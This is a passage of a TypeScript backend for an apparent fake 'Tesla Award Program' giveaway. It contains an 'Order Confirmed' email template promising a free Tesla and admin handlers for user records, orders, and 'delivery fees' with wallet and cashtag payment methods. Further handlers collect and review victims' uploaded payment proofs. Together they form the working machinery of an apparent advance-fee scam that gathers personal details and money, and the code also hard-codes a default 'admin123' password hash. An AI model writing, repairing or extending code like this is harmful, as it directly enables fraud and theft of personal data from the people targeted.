            <td align="center" style="background:linear-gradient(135deg,#0a0c10 0%,#171a20 40%,#2a1a1f 100%);padding:36px 30px 30px;">
              <table border="0" cellpadding="0" cellspacing="0">
                <tr>
                  <td align="center" style="padding-bottom:16px;">
                    <span style="display:inline-block;background:linear-gradient(135deg,#E31937,#ff4757);color:#fff;border-radius:50%;width:68px;height:68px;line-height:68px;font-size:34px;text-align:center;box-shadow:0 4px 16px rgba(227,25,55,0.4);">&#10003;</span>
                  </td>
                </tr>
                <tr>
                  <td align="center">
                    <h1 style="margin:0 0 8px;font-size:30px;font-weight:900;color:#ffffff;letter-spacing:-0.5px;">Order Confirmed!</h1>
                    <p style="margin:0;font-size:15px;color:rgba(255,255,255,0.65);line-height:1.5;">Congratulations — your Tesla award has been successfully processed.</p>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="height:5px;background:linear-gradient(90deg,#E31937,#ff6b6b,#E31937);"></td>
          </tr>
          <tr>
            <td style="padding:40px 35px;">
              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background:linear-gradient(135deg,#f8f9fa,#eef0f2);border-radius:14px;margin-bottom:28px;border:1px solid rgba(0,0,0,0.05);">
                <tr>
                  <td align="center" style="padding:24px 20px 22px;">
                    <img src="${carImg}" alt="Tesla ${carModel}" style="width:100%;max-width:300px;height:auto;display:block;margin:0 auto 16px;filter:drop-shadow(0 8px 16px rgba(0,0,0,0.12));">
                    <h3 style="margin:0 0 4px;font-size:22px;font-weight:800;color:#171a20;">Tesla ${carModel}</h3>
                    ${carPrice ? '<p style="margin:4px 0 0;font-size:14px;color:#5c5e62;">Retail Value: <strong>' + carPrice + '</strong></p>' : ''}
                    <span style="display:inline-block;background:#E31937;color:#fff;font-size:11px;font-weight:700;padding:5px 16px;border-radius:20px;margin-top:10px;letter-spacing:0.05em;text-transform:uppercase;">FREE Award Vehicle</span>
                  </td>
                </tr>
              </table>
              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom:24px;">
                <tr><td style="padding-bottom:12px;"><h3 style="margin:0;font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;color:#8d9096;">Order Summary</h3></td></tr>
                <tr>
                  <td style="background:#f8f9fa;border-radius:10px;padding:0;">
                    <table width="100%" border="0" cellpadding="0" cellspacing="0" style="font-size:14px;">
                      <tr><td style="padding:13px 18px;border-bottom:1px solid rgba(0,0,0,0.05);color:#5c5e62;width:50%;">Order ID</td><td style="padding:13px 18px;border-bottom:1px solid rgba(0,0,0,0.05);text-align:right;color:#E31937;font-family:'Courier New',monospace;font-weight:700;font-size:13px;">${orderId}</td></tr>
                      <tr><td style="padding:13px 18px;border-bottom:1px solid rgba(0,0,0,0.05);color:#5c5e62;">Tracking Number</td><td style="padding:13px 18px;border-bottom:1px solid rgba(0,0,0,0.05);text-align:right;color:#171a20;font-family:'Courier New',monospace;font-weight:700;font-size:13px;">${trackingNumber}</td></tr>
                      <tr><td style="padding:13px 18px;border-bottom:1px solid rgba(0,0,0,0.05);color:#5c5e62;">Estimated Delivery</td><td style="padding:13px 18px;border-bottom:1px solid rgba(0,0,0,0.05);text-align:right;color:#00a550;font-weight:700;">${estDelivery}</td></tr>
                      <tr><td style="padding:13px 18px;border-bottom:1px solid rgba(0,0,0,0.05);color:#5c5e62;">Delivery Method</td><td style="padding:13px 18px;border-bottom:1px solid rgba(0,0,0,0.05);text-align:right;color:#171a20;font-weight:600;">${delivMethod}</td></tr>
                      <tr><td style="padding:13px 18px;color:#5c5e62;">Payment Method</td><td style="padding:13px 18px;text-align:right;color:#171a20;font-weight:600;">${payMethod}</td></tr>
                    </table>
                  </td>
                </tr>
              </table>
              <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin-bottom:28px;">
                <tr><td style="padding-bottom:12px;"><h3 style="margin:0;font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;color:#8d9096;">Delivery Address</h3></td></tr>
                <tr>
                  <td style="background:#f8f9fa;border-radius:10px;padding:20px 18px;">
                    <p style="margin:0 0 4px;font-size:15px;font-weight:700;color:#171a20;">${fullName}</p>
                    <p style="margin:0 0 2px;font-size:14px;color:#5c5e62;">${address}</p>
                    <p style="margin:0 0 2px;font-size:14px;color:#5c5e62;">${city}${state ? ', ' + state : ''} ${zip}</p>
                    <p style="margin:0 0 10px;font-size:14px;color:#5c5e62;">${country}</p>
                    <table border="0" cellpadding="0" cellspacing="0" style="font-size:13px;">
                      <tr><td style="color:#8d9096;padding-right:8px;padding-bottom:4px;">Email</td><td style="color:#2d2d2f;font-weight:500;padding-bottom:4px;">${emailAddr}</td></tr>
                      <tr><td style="color:#8d9096;padding-right:8px;">Phone</td><td style="color:#2d2d2f;font-weight:500;">${phone}</td></tr>
                    </table>
                  </td>
                </tr>
              </table>
              <table width="100%" border="0" cellpadding="0" cellspacing="0">
                <tr>
                  <td align="center">
                    <a href="https://joshbond123.github.io/Tesla/track.html?order=${orderId}&tracking=${trackingNumber}" style="display:inline-block;background:linear-gradient(135deg,#E31937,#c41030);color:#ffffff;text-decoration:none;padding:16px 44px;border-radius:12px;font-size:16px;font-weight:700;letter-spacing:0.02em;box-shadow:0 6px 20px rgba(227,25,55,0.30);">Track Your Order</a>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="background-color:#f8f9fa;border-top:1px solid #eef0f2;padding:24px 35px;text-align:center;">
              <p style="margin:0 0 6px;font-size:12px;color:#8d9096;line-height:1.6;">Tesla Award Program &mdash; This is an automated message. Please do not reply directly to this email.<br>&copy; 2026 Tesla Award Program. All rights reserved.</p>
              <p style="margin:0;font-size:11px;color:#b0b3b8;">Tesla&reg; is a registered trademark of Tesla, Inc. This is an independent award program not affiliated with Tesla, Inc.</p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;
}

// ── ADMIN HANDLERS ────────────────────────────────────────────────────────────
// Default password hash is "admin123". It is overridable via the database
// (admin_settings key "admin_password_hash") once the admin changes their password.
const DEFAULT_ADMIN_PASSWORD_HASH = "240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9";

// Resolve the active admin password hash (DB override, else the default).
async function getAdminPasswordHash(): Promise<string> {
  const row = await dbGet1("admin_settings", "value", { key: "eq.admin_password_hash" });
  const h = (row.data?.value as any)?.hash;
  return typeof h === "string" && /^[0-9a-f]{64}$/.test(h) ? h : DEFAULT_ADMIN_PASSWORD_HASH;
}

async function sha256(text: string): Promise<string> {
  const data = new TextEncoder().encode(text);
  const hash = await crypto.subtle.digest("SHA-256", data);
  return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, "0")).join("");
}

// Validate an admin session token (stored in admin_settings as "session_<token>").
// Returns an error Response if invalid, or null when authorized.
async function requireAdmin(req: Request): Promise<Response | null> {
  const auth = req.headers.get("authorization") || "";
  const xtok = req.headers.get("x-admin-token") || "";
  const token = auth.toLowerCase().startsWith("bearer ") ? auth.slice(7).trim() : xtok.trim();
  if (!token) return json({ error: "Authentication required." }, 401);
  const row = await dbGet1("admin_settings", "key", { key: "eq.session_" + token });
  if (!row.data) return json({ error: "Invalid or expired session." }, 401);
  return null;
}

// Guard wrapper: enforce admin auth before running an admin handler.
async function adminGuard(req: Request, fn: () => Promise<Response>): Promise<Response> {
  const err = await requireAdmin(req);
  return err ? err : fn();
}

async function handleAdminAuth(req: Request) {
  let body: { password?: string };
  try { body = await req.json(); } catch { return json({ error: "Invalid request" }, 400); }
  if (!body.password) return json({ error: "Password required" }, 400);
  const hash = await sha256(body.password);
  if (hash !== await getAdminPasswordHash()) return json({ error: "Invalid password" }, 401);
  const token = hexRandom(32);
  const { error: sessionError } = await dbInsert("admin_settings", { key: "session_" + token, value: { created: new Date().toISOString() } });
  if (sessionError) {
    console.error("Admin auth: session insert failed:", sessionError);
    return json({ error: "Server error. Please try again." }, 500);
  }
  return json({ success: true, token });
}

// Change the admin password (requires an active session). Minimum 8 characters.
async function handleAdminChangePassword(req: Request) {
  let body: { current?: string; new?: string };
  try { body = await req.json(); } catch { return json({ error: "Invalid request" }, 400); }
  const current = String(body.current || "");
  const neu = String(body.new || "");
  if (!neu || neu.length < 8) return json({ error: "New password must be at least 8 characters." }, 400);
  if (await sha256(current) !== await getAdminPasswordHash()) return json({ error: "Current password is incorrect." }, 401);
  const newHash = await sha256(neu);
  const upR = await upsertAdminSetting("admin_password_hash", { hash: newHash });
  if (!upR.ok) return json({ error: "Failed to update password." }, 500);
  return json({ success: true });
}

async function handleAdminUsers(_req: Request) {
  const r = await fetch(REST + "/giveaway_users?select=id,auth_user_id,email,phone,first_name,last_name,verification_status,entry_count,created_at,verified_at&order=created_at.desc&limit=500", { headers: SB_HEADERS });
  if (!r.ok) return json({ error: "Failed to fetch users" }, 500);
  const users = await r.json();
  return json({ users });
}

async function handleAdminDeleteUser(req: Request) {
  let body: { id?: string; email?: string };
  try { body = await req.json(); } catch { return json({ error: "Invalid request" }, 400); }
  const { id, email } = body;
  if (!id && !email) return json({ error: "User ID or email required" }, 400);
  
  const filter = id ? { id: "eq." + id } : { email: "eq." + (email || "") };
  const qs = buildQs("id,auth_user_id", filter, "limit=1");
  const lookup = await fetch(REST + "/giveaway_users?" + qs, { headers: SB_HEADERS });
  if (!lookup.ok) return json({ error: "User not found" }, 404);
  const rows = await lookup.json();
  const user = rows[0];
  if (!user) return json({ error: "User not found" }, 404);
  
  if (user.auth_user_id) {
    await fetch(AUTH + "/admin/users/" + user.auth_user_id, { method: "DELETE", headers: SB_HEADERS });
  }
  const delR = await fetch(REST + "/giveaway_users?id=eq." + user.id, { method: "DELETE", headers: SB_HEADERS });
  if (!delR.ok) return json({ error: "Failed to delete user" }, 500);
  return json({ success: true });
}

// ── DELIVERY FEE SETTINGS ─────────────────────────────────────────────────────
// Delivery fees live in admin_settings (key = "delivery_fee") as one JSON
// document. We standardize on snake_case keys (standard_fee / express_fee) while
// keeping the legacy standard/express aliases so every consumer — admin panel,
// customer pages, stats — reads the same authoritative, DB-backed value.

const DEFAULT_STANDARD_FEE = 299;
const DEFAULT_EXPRESS_FEE = 399;
const DEFAULT_CURRENCY = "USD";
const SUPPORTED_CURRENCY_CODES = new Set([
  "USD", "EUR", "GBP", "CAD", "AUD", "NGN", "GHS", "KES", "ZAR",
  "INR", "JPY", "CNY", "CHF", "AED", "BRL",
]);

function numberOr(val: any, fallback: number): number {
  const n = typeof val === "string" ? Number(val) : val;
  return typeof n === "number" && Number.isFinite(n) ? n : fallback;
}

// Coerce a user-supplied fee into a valid number, or null when invalid.
function normalizeFee(val: any): number | null {
  if (val === null || val === undefined || (typeof val === "string" && val.trim() === "")) return null;
  const n = typeof val === "string" ? Number(val) : val;
  if (typeof n !== "number" || !Number.isFinite(n) || n < 0) return null;
  return Math.min(Math.round(n * 100) / 100, 100000); // round to cents, sane cap
}

// Insert-or-update a single admin_settings row keyed by `key` (true upsert).
async function upsertAdminSetting(key: string, value: Record<string, unknown>) {
  return fetch(REST + "/admin_settings?on_conflict=key", {
    method: "POST",
    headers: { ...SB_HEADERS, Prefer: "resolution=merge-duplicates,return=minimal" },
    body: JSON.stringify({ key, value, updated_at: new Date().toISOString() }),
  });
}

// Read authoritative delivery fees + currency, initializing the database with
// realistic defaults the first time and normalizing legacy key names.
async function readDeliveryFees(): Promise<{ standard_fee: number; express_fee: number; currency: string }> {
  const row = await dbGet1("admin_settings", "value", { key: "eq.delivery_fee" });
  const v = (row.data?.value ?? {}) as Record<string, any>;
  const std = numberOr(v.standard_fee, numberOr(v.standard, numberOr(v.amount, NaN)));
  const exp = numberOr(v.express_fee, numberOr(v.express, NaN));

  const standard_fee = Number.isFinite(std) ? std : DEFAULT_STANDARD_FEE;
  const express_fee = Number.isFinite(exp) ? exp : DEFAULT_EXPRESS_FEE;
  const currency = typeof v.currency === "string" && SUPPORTED_CURRENCY_CODES.has(v.currency.toUpperCase())
    ? v.currency.toUpperCase() : DEFAULT_CURRENCY;

  if (!Number.isFinite(std) || !Number.isFinite(exp) || !v.currency) {
    await upsertAdminSetting("delivery_fee", { standard_fee, express_fee, standard: standard_fee, express: express_fee, currency });
  }
  return { standard_fee, express_fee, currency };
}

async function handleAdminGetSettings() {
  const { standard_fee, express_fee, currency } = await readDeliveryFees();
  let paymentPhone = "+1 (581) 478-3495";
  const phoneRow = await dbGet1("admin_settings", "value", { key: "eq.payment_phone" });
  if (phoneRow.data?.value?.number) paymentPhone = phoneRow.data.value.number;

  return json({
    standard_fee,
    express_fee,
    currency,
    deliveryFee: standard_fee,         // legacy alias (= standard)
    deliveryFeeStandard: standard_fee, // legacy alias
    deliveryFeeExpress: express_fee,   // legacy alias
    paymentPhone,
  });
}

// Public endpoint for customer-facing pages (delivery-method, payment, etc.).
// Always reads live from the database so admin updates appear with no code change.
async function handlePublicDeliveryFees() {
  const { standard_fee, express_fee, currency } = await readDeliveryFees();
  return new Response(JSON.stringify({
    standard_fee,
    express_fee,
    currency,
    deliveryFee: standard_fee,
    deliveryFeeStandard: standard_fee,
    deliveryFeeExpress: express_fee,
  }), {
    status: 200,
    headers: { ...CORS, "Content-Type": "application/json", "Cache-Control": "no-store" },
  });
}

async function handleAdminSaveSettings(req: Request) {
  let body: any;
  try { body = await req.json(); } catch { return json({ error: "Invalid request body." }, 400); }

  // Accept snake_case (current frontend) and legacy camelCase / short keys.
  const hasStd = [body.standard_fee, body.deliveryFeeStandard, body.standard, body.amount].some((v) => v !== undefined);
  const hasExp = [body.express_fee, body.deliveryFeeExpress, body.express].some((v) => v !== undefined);
  const hasCurrency = typeof body.currency === "string" && body.currency.trim() !== "";
  const hasPhone = body.paymentPhone !== undefined;

  if (!hasStd && !hasExp && !hasCurrency && !hasPhone) {
    return json({ error: "No values to update." }, 400);
  }

  // Validate: every supplied fee must be a valid, non-negative number.
  const std = hasStd ? normalizeFee(body.standard_fee ?? body.deliveryFeeStandard ?? body.standard ?? body.amount) : null;
  const exp = hasExp ? normalizeFee(body.express_fee ?? body.deliveryFeeExpress ?? body.express) : null;
  if (hasStd && std === null) return json({ error: "Standard delivery fee must be a valid number (0 or greater)." }, 400);
  if (hasExp && exp === null) return json({ error: "Express delivery fee must be a valid number (0 or greater)." }, 400);

  // Validate currency (must be one of the supported codes).
  let currency: string | null = null;
  if (hasCurrency) {
    const c = String(body.currency).trim().toUpperCase();
    if (!SUPPORTED_CURRENCY_CODES.has(c)) return json({ error: "Unsupported currency: " + c + "." }, 400);
    currency = c;
  }

  // Merge with the current values and persist to the database.
  const current = await readDeliveryFees();
  const standard_fee = std !== null ? std : current.standard_fee;
  const express_fee = exp !== null ? exp : current.express_fee;
  const cur = currency !== null ? currency : current.currency;
  const feeR = await upsertAdminSetting("delivery_fee", { standard_fee, express_fee, standard: standard_fee, express: express_fee, currency: cur });
  if (!feeR.ok) return json({ error: "Failed to save delivery fees." }, 500);

  // Payment phone (optional field retained for the existing phone setting).
  let paymentPhone = "+1 (581) 478-3495";
  if (hasPhone) {
    paymentPhone = String(body.paymentPhone ?? "").trim();
    const pr = await upsertAdminSetting("payment_phone", { number: paymentPhone });
    if (!pr.ok) return json({ error: "Failed to save payment phone." }, 500);
  } else {
    const phoneRow = await dbGet1("admin_settings", "value", { key: "eq.payment_phone" });
    if (phoneRow.data?.value?.number) paymentPhone = phoneRow.data.value.number;
  }

  return json({
    success: true,
    standard_fee,
    express_fee,
    currency: cur,
    deliveryFee: standard_fee,
    deliveryFeeStandard: standard_fee,
    deliveryFeeExpress: express_fee,
    paymentPhone,
  });
}

async function handleAdminOrders(_req: Request) {
  const r = await fetch(REST + "/orders?select=order_id,tracking_number,status,order_date,estimated_delivery,delivery_method,payment_method,giveaway_users(email)&order=order_date.desc&limit=200", { headers: SB_HEADERS });
  if (!r.ok) return json({ orders: [] });
  const rows = await r.json();
  const orders = rows.map((row: any) => {
    const user = Array.isArray(row.giveaway_users) ? row.giveaway_users[0] : row.giveaway_users;
    return {
      orderId: row.order_id,
      trackingNumber: row.tracking_number,
      email: user?.email ?? "",
      status: row.status,
      estimatedDelivery: row.estimated_delivery,
      orderDate: row.order_date,
      deliveryMethod: row.delivery_method ?? {},
      paymentMethod: row.payment_method ?? {},
      selectedCar: {}
    };
  });
  return json({ orders });
}

async function handleAdminGetStats() {
  const r = await fetch(REST + "/giveaway_users?select=verification_status", { headers: SB_HEADERS });
  if (!r.ok) return json({ total: 0, verified: 0, pending: 0 });
  const users = await r.json();
  const total = users.length;
  const verified = users.filter((u: any) => u.verification_status === "verified").length;
  const pending = total - verified;
  
  const { standard_fee } = await readDeliveryFees();
  return json({ total, verified, pending, deliveryFee: standard_fee });
}

// ── PAYMENT METHODS ───────────────────────────────────────────────────────────
// The rich per-method configuration is stored as a single JSON document in
// admin_settings (key = "payment_methods") so nested config survives intact.

    // ── ROW <-> METHOD CONVERSION HELPERS ────────────────────────────────────────
    function methodToRow(m: Record<string, unknown>): Record<string, unknown> {
    const config = (typeof m.config === 'object' && m.config !== null
      ? m.config
      : {}) as Record<string, unknown>;
    const slug = String(m.id || '').replace(/[^a-z0-9_-]/gi, '').slice(0, 64) || ('method-' + Date.now());
    return {
      slug,
      name: String(m.name || ''),
      display_name: String(m.name || ''),
      type: String(m.type || 'wallet'),
      description: String(m.description || ''),
      enabled: m.enabled !== false,
      sort_order: Number(m.displayOrder) || 999,
      logo_url: String(m.logo || ''),
      logo_id: slug,
      wallet_address: String(
        config.walletAddress ?? config.cashtag ?? config.username ?? config.email ?? config.phone ?? ''
      ),
      account_details: JSON.stringify(config),
      qr_code_url: String(config.qrCode ?? ''),
      payment_instructions: String(config.instructions ?? ''),
      config: config,
      updated_at: new Date().toISOString(),
    };
    }

    function rowToMethod(row: Record<string, unknown>): Record<string, unknown> {
    let config: Record<string, unknown> = {};
    try {
      if (row.config && typeof row.config === 'object' && !Array.isArray(row.config)) {
        config = row.config as Record<string, unknown>;
      } else if (row.account_details) {
        config = JSON.parse(String(row.account_details));
      }
    } catch { /* ignore */ }
    return {
      id: String(row.slug || row.id || ''),
      name: String(row.name || ''),
      description: String(row.description || row.display_name || ''),
      type: String(row.type || 'wallet'),
      logo: String(row.logo_url || ''),
      enabled: row.enabled !== false,
      displayOrder: Number(row.sort_order) || 999,
      config,
      lastUpdated: String(row.updated_at || row.created_at || new Date().toISOString()),
    };
    }

    // ── PAYMENT METHODS: PUBLIC READ ──────────────────────────────────────────────
    async function handlePublicPaymentMethods() {
    const r = await fetch(
      REST + "/payment_methods?select=*&enabled=eq.true&order=sort_order.asc",
      { headers: SB_HEADERS },
    );
    if (!r.ok) {
      console.error("handlePublicPaymentMethods failed:", await r.text());
      return json({ methods: [] });
    }
    const rows = (await r.json()) as Record<string, unknown>[];
    return json({ methods: rows.map(rowToMethod) });
    }

    // ── PAYMENT METHODS: ADMIN READ ───────────────────────────────────────────────
    async function handleAdminGetPaymentMethods() {
    const r = await fetch(
      REST + "/payment_methods?select=*&order=sort_order.asc",
      { headers: SB_HEADERS },
    );
    if (!r.ok) {
      console.error("handleAdminGetPaymentMethods failed:", await r.text());
      return json({ methods: [] });
    }
    const rows = (await r.json()) as Record<string, unknown>[];
    return json({ methods: rows.map(rowToMethod) });
    }

    // ── PAYMENT METHODS: ADMIN BULK UPSERT ───────────────────────────────────────
    async function handleAdminSavePaymentMethods(req: Request) {
    let body: { methods?: unknown };
    try {
      body = await req.json();
    } catch {
      return json({ error: "Invalid request" }, 400);
    }
    if (!Array.isArray(body.methods)) {
      return json({ error: "methods must be an array." }, 400);
    }

    const methods = body.methods as Record<string, unknown>[];
    const rows = methods.map(methodToRow);

    // 1. Find slugs currently in DB
    const existingRes = await fetch(
      REST + "/payment_methods?select=slug",
      { headers: SB_HEADERS },
    );
    const existingRows = existingRes.ok
      ? ((await existingRes.json()) as { slug: string }[])
      : [];
    const existingSlugs = new Set(existingRows.map((r) => r.slug).filter(Boolean));
    const newSlugs = new Set(rows.map((r) => String(r.slug)).filter(Boolean));

    // 2. Delete rows no longer in the new set
    const toDelete = [...existingSlugs].filter((s) => !newSlugs.has(s));
    if (toDelete.length > 0) {
      const delFilter = toDelete.map((s) => encodeURIComponent(s)).join(",");
      await fetch(REST + "/payment_methods?slug=in.(" + delFilter + ")", {
        method: "DELETE",
        headers: { ...SB_HEADERS, Prefer: "return=minimal" },
      });
    }

    // 3. Upsert the full set (insert new, update existing matched by slug unique index)
    const upsertRes = await fetch(
      REST + "/payment_methods?on_conflict=slug",
      {
        method: "POST",
        headers: { ...SB_HEADERS, Prefer: "resolution=merge-duplicates,return=minimal" },
        body: JSON.stringify(rows),
      },
    );

    if (!upsertRes.ok) {
      const errText = await upsertRes.text();
      console.error("Payment methods upsert failed:", errText);
      return json({ error: "Failed to save payment methods: " + errText }, 500);
    }

    return json({ success: true, count: methods.length });
    }

    // ── PAYMENT METHODS: ADMIN DELETE SINGLE ─────────────────────────────────────
    async function handleAdminDeletePaymentMethod(slugOrId: string) {
    let r = await fetch(
      REST + "/payment_methods?slug=eq." + encodeURIComponent(slugOrId),
      { method: "DELETE", headers: { ...SB_HEADERS, Prefer: "return=minimal" } },
    );
    if (!r.ok) {
      r = await fetch(
        REST + "/payment_methods?id=eq." + encodeURIComponent(slugOrId),
        { method: "DELETE", headers: { ...SB_HEADERS, Prefer: "return=minimal" } },
      );
    }
    if (!r.ok) return json({ error: "Failed to delete payment method" }, 500);
    return json({ success: true });
    }

    // ── PAYMENT METHODS: ADMIN SINGLE UPSERT (add / edit) ────────────────────────
    // Used by the admin panel's per-method save (add/edit/toggle). Upserts by slug
    // and returns the DB id so the client can issue PUTs on subsequent edits.
    async function handleAdminUpsertPaymentMethod(req: Request) {
    let body: Record<string, unknown>;
    try { body = await req.json(); } catch { return json({ error: "Invalid request" }, 400); }
    if (!body || (!body.id && !body.name)) return json({ error: "id or name required" }, 400);
    const row = methodToRow(body);
    const upR = await fetch(REST + "/payment_methods?on_conflict=slug", {
      method: "POST",
      headers: { ...SB_HEADERS, Prefer: "resolution=merge-duplicates,return=representation" },
      body: JSON.stringify(row),
    });
    if (!upR.ok) return json({ error: "Failed to save payment method: " + await upR.text() }, 500);
    const rows = (await upR.json()) as Record<string, unknown>[];
    const saved = rows[0] || {};
    return json({ success: true, _db_id: saved.id || row.slug, method: rowToMethod(saved) });
    }

    
async function handleSubmitPaymentProof(req: Request) {
  let body: Record<string, unknown>;
  try {
    body = await req.json();
  } catch {
    return json({ error: "Invalid request" }, 400);
  }
  const orderId = String(body.order_id ?? "");

  // Support both single proof_url and multiple proof_urls
  let proofUrls: string[] = [];
  if (body.proof_urls && Array.isArray(body.proof_urls)) {
    proofUrls = (body.proof_urls as string[]).filter((u: string) => u && u.length > 0);
  }
  const singleUrl = String(body.proof_url ?? "");
  if (singleUrl && !proofUrls.includes(singleUrl)) {
    proofUrls.unshift(singleUrl);
  }
  const backUrl = String(body.proof_back_url ?? "");
  if (backUrl && !proofUrls.includes(backUrl)) {
    proofUrls.push(backUrl);
  }

  if (!orderId || proofUrls.length === 0) {
    return json({ error: "Missing order_id or proof image(s)." }, 400);
  }

  const proof: Record<string, unknown> = {
    order_id: orderId,
    payment_method: String(body.payment_method ?? "Unknown"),
    proof_url: proofUrls[0],  // primary image for backward compat
    proof_urls: JSON.stringify(proofUrls),  // store all URLs as JSON
    proof_type: String(body.proof_type ?? "image"),
    amount: body.amount != null ? String(body.amount) : null,
    status: "pending",
  };
  // Store proof_back_url for backward compatibility
  if (proofUrls.length > 1) proof.proof_back_url = proofUrls[proofUrls.length - 1];

  const { data, error } = await dbInsert(
    "payment_proofs",
    proof,
    "id,created_at",
  );
  if (error || !data) {
    console.error("Payment proof: insert failed:", error);
    return json({ error: "Failed to submit payment proof." }, 500);
  }
  return json({ success: true, proof: data });
}

async function handleAdminGetPaymentProofs() {
  // Load payment proofs WITH joined user, order, car, and delivery data
  // Step 1: Get all proofs
  const proofsR = await fetch(
    REST + "/payment_proofs?select=*&order=created_at.desc&limit=200",
    { headers: SB_HEADERS },
  );
  if (!proofsR.ok) {
    console.error("Payment proofs: load failed:", await proofsR.text());
    return json({ proofs: [] });
  }
  const proofs = await proofsR.json() as Record<string, unknown>[];

  // Step 2: For each proof, look up the order and associated user/car/delivery data
  const enrichedProofs = [];
  for (const proof of proofs) {
    const orderId = String(proof.order_id || "");
    const enriched = { ...proof };

    if (orderId) {
      try {
        // Look up the order to get user_id
        const orderR = await fetch(
          REST + "/orders?select=id,user_id,delivery_method,payment_method,order_date,estimated_delivery&order_id=eq." + encodeURIComponent(orderId) + "&limit=1",
          { headers: SB_HEADERS },
        );
        if (orderR.ok) {
          const orderRows = await orderR.json();
          if (orderRows.length > 0) {
            const order = orderRows[0];
            enriched.delivery_method = order.delivery_method || {};
            enriched.order_date = order.order_date || proof.created_at;

            // Look up user data
            if (order.user_id) {
              const userR = await fetch(
                REST + "/giveaway_users?select=id,email,phone,first_name,last_name&id=eq." + order.user_id + "&limit=1",
                { headers: SB_HEADERS },
              );
              if (userR.ok) {
                const userRows = await userR.json();
                if (userRows.length > 0) {
                  const user = userRows[0];
                  enriched.user_name = (user.first_name || "") + " " + (user.last_name || "");
                  enriched.user_name = enriched.user_name.trim();
                  enriched.user_email = user.email || "";
                  enriched.user_phone = user.phone || "";
                  enriched.user_id = user.id;
                }
              }

              // Look up selected car
              const carR = await fetch(
                REST + "/selected_cars?select=data&user_id=eq." + order.user_id + "&order=created_at.desc&limit=1",
                { headers: SB_HEADERS },
              );
              if (carR.ok) {
                const carRows = await carR.json();
                if (carRows.length > 0 && carRows[0].data) {
                  enriched.selected_car = carRows[0].data;
                }
              }

              // Look up delivery details
              const deliveryR = await fetch(
                REST + "/delivery_details?select=data&user_id=eq." + order.user_id + "&order=created_at.desc&limit=1",
                { headers: SB_HEADERS },
              );
              if (deliveryR.ok) {
                const deliveryRows = await deliveryR.json();
                if (deliveryRows.length > 0 && deliveryRows[0].data) {
                  enriched.delivery_details = deliveryRows[0].data;
                }
              }
            }
          }
        }
      } catch (err) {
        console.error("Payment proofs: failed to enrich proof " + orderId + ":", err);
      }
    }

    // Handle proof_urls array for multiple images
    // If proof_urls exists as a JSON string, parse it; otherwise create array from proof_url + proof_back_url
    let proofUrls: string[] = [];
    if (proof.proof_urls) {
      try {
        if (typeof proof.proof_urls === 'string') {
          proofUrls = JSON.parse(proof.proof_urls);
        } else if (Array.isArray(proof.proof_urls)) {
          proofUrls = proof.proof_urls as string[];
        }
      } catch { /* ignore */ }
    }
    // Also include proof_url and proof_back_url if they're not in the array
    if (proof.proof_url && typeof proof.proof_url === 'string' && proof.proof_url.length > 0) {
      if (!proofUrls.includes(proof.proof_url)) {
        proofUrls.unshift(proof.proof_url);
      }
    }
    if (proof.proof_back_url && typeof proof.proof_back_url === 'string' && proof.proof_back_url.length > 0) {
      if (!proofUrls.includes(proof.proof_back_url)) {
        proofUrls.push(proof.proof_back_url);
      }
    }
    enriched.proof_urls = proofUrls;

    enrichedProofs.push(enriched);
  }

  return json({ proofs: enrichedProofs });
}


// ── PAYMENT PROOF APPROVAL / REJECTION ──────────────────────────────────────
async function handleAdminApproveProof(req: Request) {
  let body: { id?: string };
  try { body = await req.json(); } catch { return json({ error: "Invalid request" }, 400); }
  if (!body.id) return json({ error: "Proof id required" }, 400);
  
  const r = await fetch(REST + "/payment_proofs?id=eq." + body.id, {
    method: "PATCH",
    headers: { ...SB_HEADERS, Prefer: "return=representation" },
    body: JSON.stringify({ status: "approved", reviewed_at: new Date().toISOString() }),
  });
  if (!r.ok) return json({ error: "Failed to approve proof" }, 500);
  const rows = await r.json();
  return json({ success: true, proof: rows[0] });
}

async function handleAdminRejectProof(req: Request) {
  let body: { id?: string };
  try { body = await req.json(); } catch { return json({ error: "Invalid request" }, 400); }
  if (!body.id) return json({ error: "Proof id required" }, 400);
  
  const r = await fetch(REST + "/payment_proofs?id=eq." + body.id, {
    method: "PATCH",
    headers: { ...SB_HEADERS, Prefer: "return=representation" },
    body: JSON.stringify({ status: "rejected", reviewed_at: new Date().toISOString() }),
  });
  if (!r.ok) return json({ error: "Failed to reject proof" }, 500);
  const rows = await r.json();
  return json({ success: true, proof: rows[0] });
}

// ── PAYMENT PROOF: PERMANENT DELETE ──────────────────────────────────────────
// Removes the database record and best-effort deletes any Supabase Storage
// objects referenced by the proof (data: URLs are skipped — they live in the row).
async function handleAdminDeleteProof(req: Request) {
  let body: { id?: string };
  try { body = await req.json(); } catch { return json({ error: "Invalid request" }, 400); }
  if (!body.id) return json({ error: "Proof id required" }, 400);

  // Best-effort storage cleanup for any real storage object URLs.
  try {
    const proofRow = await dbGet1("payment_proofs", "proof_url,proof_urls,proof_back_url", { id: "eq." + body.id });
    const urls: string[] = [];
    const collect = (v: unknown) => {
      if (typeof v !== "string" || !v) return;
      try { const p = JSON.parse(v); if (Array.isArray(p)) { p.forEach(collect); return; } } catch { /* not json */ }
      urls.push(v);
    };
    if (proofRow.data) {
      const d = proofRow.data as Record<string, unknown>;
      collect(d.proof_urls); collect(d.proof_url); collect(d.proof_back_url);
    }
    for (const u of urls) {
      const m = String(u).match(/\/storage\/v1\/object\/(?:public\/)?([^/]+)\/(.+)$/);
      if (m) {
        await fetch(SUPABASE_URL + "/storage/v1/object/" + m[1] + "/" + m[2], { method: "DELETE", headers: SB_HEADERS });
      }
    }
  } catch { /* best-effort; proceed to row delete */ }

  const r = await fetch(REST + "/payment_proofs?id=eq." + encodeURIComponent(body.id), {
    method: "DELETE",
    headers: { ...SB_HEADERS, Prefer: "return=minimal" },
  });
  if (!r.ok) return json({ error: "Failed to delete proof" }, 500);
  return json({ success: true });
}

async function handleGetPaymentStatus(req: Request) {
  const url = new URL(req.url);
